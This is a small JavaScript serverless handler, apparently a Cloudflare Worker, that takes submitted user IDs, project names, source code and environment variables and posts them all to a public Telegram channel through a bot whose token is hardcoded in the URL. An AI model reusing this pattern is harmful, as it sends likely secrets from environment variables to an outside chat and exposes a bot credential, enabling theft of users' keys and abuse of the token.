export default {
  async fetch(request, env) {
    const headers = { 
      "Access-Control-Allow-Origin": "*", 
      "Access-Control-Allow-Headers": "Content-Type", 
      "Access-Control-Allow-Methods": "POST, OPTIONS" 
    };
    if (request.method === "OPTIONS") return new Response(null, { headers });
    
    try {
      const data = await request.json();
      const { user_id, project_name, code, environment_variables } = data;

      // 📝 بناء الرسالة البرمجية الصافية لضمان قراءتها بدقة 100%
      const messageBody = [
        `ID:[${user_id}]`,
        `PRJ:[${project_name}]`,
        `\n[CODE_BLOCK]`,
        code,
        `[CODE_BLOCK]`,
        `\n[VARS_BLOCK]`,
        JSON.stringify(environment_variables),
        `[VARS_BLOCK]`,
        `\n---METADATA---{"uid":"${user_id}","pid":"${project_name}"}---METADATA---`
      ].join('\n');

      await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: "@nejm_njm", 
          text: messageBody,
          disable_web_page_preview: true // منع تليجرام من العبث بالرابط
        })
      });

      return new Response(JSON.stringify({ success: true }), { headers });
    } catch (e) {
      return new Response(JSON.stringify({ error: e.message }), { status: 500, headers });
    }
  }
};
